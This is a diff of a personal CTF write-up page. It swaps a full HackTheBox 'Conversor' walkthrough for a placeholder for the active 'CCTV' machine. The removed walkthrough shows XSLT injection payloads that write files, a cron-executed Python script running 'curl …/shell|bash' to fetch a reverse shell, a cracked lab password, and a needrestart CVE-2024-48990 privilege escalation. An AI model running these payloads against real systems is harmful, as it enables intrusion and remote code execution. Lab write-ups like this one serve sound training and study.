@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="index, follow">
-    <title>Conversor - Hexicon Archives</title>
+    <meta name="robots" content="noindex">
+    <title>CCTV - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
-    <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Conversor.html" />
+    <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/CCTV.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Detailed writeup for Conversor machine from HackTheBox - Easy difficulty level">
-    <meta name="keywords" content="HackTheBox, Conversor, Easy, CTF, writeup, cybersecurity, penetration testing, Hexicon">
+    <meta name="description" content="Restricted writeup for CCTV machine from HackTheBox - Easy difficulty level">
+    <meta name="keywords" content="HackTheBox, CCTV, Easy, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
     <header>
@@ -56,131 +56,19 @@
     <div class="backdrop"></div>
     
     <main class="container writeup-content">
-        <h1 class="writeup-title">Conversor</h1>
+        <h1 class="writeup-title">CCTV</h1>
         <div class="writeup-metadata">
             <span class="difficulty easy">Easy</span>
-            <span class="date">March 21, 2026</span>
+            <span class="date">Active machine</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="pwned" src="../images/Conversor/pwned.png" /></p>
-<p>Conversor was an easy-difficulty Linux machine that began with an nmap scan revealing SSH on port 22 and HTTP on port 80.
-The web application allowed users to register and upload XML and XSLT file pairs for document transformation. Identifying the underlying processor via XSLT's built-in system-property() function confirmed the backend was using libxslt, and a 404 error fingerprinted the web framework as Flask.
-Researching XSLT injection payloads revealed that libxslt supports EXSLT's document() extension element, which can write arbitrary content to the filesystem.
-Downloading the app's source code from an exposed /about endpoint revealed a cron job executing every minute that ran all Python scripts found in /var/www/conversor.htb/scripts/. By crafting a malicious XSLT stylesheet that used exploit:document to write a Python reverse shell script into the scripts directory, code execution was triggered on the next cron cycle, granting a foothold as www-data.
-Reviewing app.py exposed the path to a SQLite database, which contained an MD5-hashed password for the user fismathack. Cracking the hash via CrackStation revealed the plaintext credential, which was reused for SSH access and yielded the user flag.</p>
-<p>For privilege escalation, sudo -l revealed that fismathack could run needrestart as root. The installed version, 3.7, was vulnerable to CVE-2024-48990, which allows privilege escalation by manipulating PYTHONPATH to load a malicious shared library during needrestart's Python interpreter scan.
-Compiling the malicious library locally, placing it at the expected path on the target, and triggering needrestart via sudo caused it to execute the payload as root, resulting in a root shell.</p>
-<h1>User flag</h1>
-<p><img alt="nmap" src="../images/Conversor/nmap.png" /></p>
-<p>Initial nmap scan reveals just 2 ports open. HTTP on 80, and SSH on 22.</p>
-<h2>Looking through the website</h2>
-<p>After creating an account of <code>test:test</code>, I was redirected to an upload form on the website.</p>
-<p><img alt="website" src="../images/Conversor/website.png" /></p>
-<p>I can upload both an XML and an XSLT file. Both must be present because XSLT works off an XML file to create a stylized document.</p>
-<p>Knowing this, I visited <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection</a> to see what kind of payloads I could use.</p>
-<p>While I couldn't use the XXE payloads to exfiltrate data, I managed to find out a few details about the underlying processor and the webapp.</p>
-<pre class="codehilite"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;html xsl:version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot;&gt;
-&lt;body&gt;
-&lt;br /&gt;Version: &lt;xsl:value-of select=&quot;system-property('xsl:version')&quot; /&gt;
-&lt;br /&gt;Vendor: &lt;xsl:value-of select=&quot;system-property('xsl:vendor')&quot; /&gt;
-&lt;br /&gt;Vendor URL: &lt;xsl:value-of select=&quot;system-property('xsl:vendor-url')&quot; /&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-
-<p>Returns:</p>
-<pre class="codehilite"><code>Version: 1.0
-Vendor: libxslt
-Vendor URL: http://xmlsoft.org/XSLT/
-</code></pre>
-
-<p>Confirming that the XSLT file is processed by a Python script using <code>libxslt</code>. On the topic of Python, the webapp itself is running Flask. This can be confirmed after forcing a 404 status code.</p>
-<p><img alt="flask" src="../images/Conversor/flask.png" /></p>
-<p>I'll try writing a file to a known/popular directory for Python, <code>static</code>. I will guess that the webroot of the app is either at <code>/var/www/conversor.htb</code> or <code>/opt/www/conversor.htb</code></p>
-<pre class="codehilite"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;xsl:stylesheet
-  xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
-  xmlns:exploit=&quot;http://exslt.org/common&quot; 
-  extension-element-prefixes=&quot;exploit&quot;
-  version=&quot;1.0&quot;&gt;
-  &lt;xsl:template match=&quot;/&quot;&gt;
-    &lt;exploit:document href=&quot;/var/www/conversor.htb/static/evil.txt&quot; method=&quot;text&quot;&gt;
-      Hello World!
-    &lt;/exploit:document&gt;
-  &lt;/xsl:template&gt;
-&lt;/xsl:stylesheet&gt;
-</code></pre>
-
-<p>(This is also a payload from PayloadsAllTheThings)</p>
-<p><img alt="filewrite" src="../images/Conversor/filewrite.png" /></p>
-<h2>Writing to the scripts directory</h2>
-<p>Right now, I'm just writing a file into the static directory. There will be no code execution there, as I can't just pass an argument with a command like with PHP.</p>
-<p><img alt="search" src="../images/Conversor/search.png" /></p>
-<p>Fuzzing for directories reveals the <code>/about</code> endpoint(Which has a button on the main page... Which I completely missed :D).</p>
-<p><img alt="about" src="../images/Conversor/about.png" /></p>
-<p>From this page, I can download a <code>tar.gz</code> archive with the app's source code.</p>
-<p><img alt="source" src="../images/Conversor/source.png" /></p>
-<p>There is a markdown file, as well as a <code>scripts</code> directory. I'll read the md file now.</p>
-<pre class="codehilite"><code>&quot;&quot;&quot;
-tar -xvf source_code.tar.gz
-&quot;&quot;&quot;
-
-We install flask:
-
-&quot;&quot;&quot;
-pip3 install flask
-&quot;&quot;&quot;
-
-We can run the app.py file:
-
-&quot;&quot;&quot;
-python3 app.py
-&quot;&quot;&quot;
-
-You can also run it with Apache using the app.wsgi file.
-
-If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.
-
-&quot;&quot;&quot;
-* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 &quot;$f&quot;; done
-&quot;&quot;&quot;
-</code></pre>
-
-<p>So Python scripts written into the <code>/scripts</code> directory will be executed. I will create a reverse shell script that will download and execute my payload.</p>
-<pre class="codehilite"><code>    &lt;exploit:document href=&quot;/var/www/conversor.htb/scripts/evil.py&quot; method=&quot;text&quot;&gt;
-import os
-
-os.system(&quot;curl http://10.10.16.213:8000/shell|bash&quot;)
-    &lt;/exploit:document&gt;
-</code></pre>
-
-<p><img alt="shell" src="../images/Conversor/shell.png" /></p>
-<h2>Exploring the webroot</h2>
-<p><code>app.py</code> reveals that the database is located under <code>/var/www/conversor.htb/instance/users.db</code></p>
-<p><img alt="database" src="../images/Conversor/database.png" /></p>
-<p>Since this is an MD5 hash, I will use CrackStation to crack it.</p>
-<p><img alt="crack" src="../images/Conversor/crack.png" /></p>
-<p><code>fismathack | Keepmesafeandwarm</code></p>
-<p>I'll try to SSH into the box with these credentials.</p>
-<p><img alt="user" src="../images/Conversor/user.png" /></p>
-<h1>Root flag</h1>
-<p><img alt="sudol" src="../images/Conversor/sudol.png" /></p>
-<p>Fismathack can run <code>needrestart</code> as sudo. This is a binary used to detect daemons/services that need restarts after library updates.</p>
-<p><img alt="info" src="../images/Conversor/info.png" /></p>
-<p>Looking for CVEs affecting needrestart 3.7, I found 3 matching results on CVEdetails.</p>
-<p><a href="https://www.cvedetails.com/vulnerability-list/vendor_id-27171/product_id-114964/version_id-2014147/year-2024/opec-1/Needrestart-Project-Needrestart-3.7.html">https://www.cvedetails.com/vulnerability-list/vendor_id-27171/product_id-114964/version_id-2014147/year-2024/opec-1/Needrestart-Project-Needrestart-3.7.html</a></p>
-<p><img alt="poc" src="../images/Conversor/poc.png" /></p>
-<p>I can see that CVE-2024-48990 has a public exploit available, so I'll look for it on the web.</p>
-<p><a href="https://github.com/makuga01/CVE-2024-48990-PoC">https://github.com/makuga01/CVE-2024-48990-PoC</a></p>
-<p>This PoC will compile a malicious C lib that attains root privileges, and creates a SUID bash binary in a pre-made directory. Since the box doesn't have the GCC compiler, I will prepare the library on my box, and I'll recreate the necessary structure on the victim manually.</p>
-<p><code>/tmp/importlib/__init__.so</code></p>
-<p>Once the malicious lib is in its place, I will run <code>PYTHONPATH="$PWD" python3 e.py'</code> in one terminal, while running <code>needrestart</code> in a different shell.</p>
-<p><img alt="root" src="../images/Conversor/root.png" /></p>
-<p>Rooted!</p>
+                <p><img alt="solved" src="../images/CCTV/solved.png" /></p>
+<p>CCTV is an ACTIVE machine!</p>
+<p>This write-up will go live once CCTV retires.</p>
+<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
             </div>
             
             <div class="toc-sidebar">
@@ -257,7 +145,7 @@ os.system(&quot;curl http://10.10.16.213:8000/shell|bash&quot;)
                     link.textContent = data.title;
                     
                     // Highlight current machine
-                    if (data.title === "Conversor") {
+                    if (data.title === "CCTV") {
                         link.classList.add('active');
                     }
                     
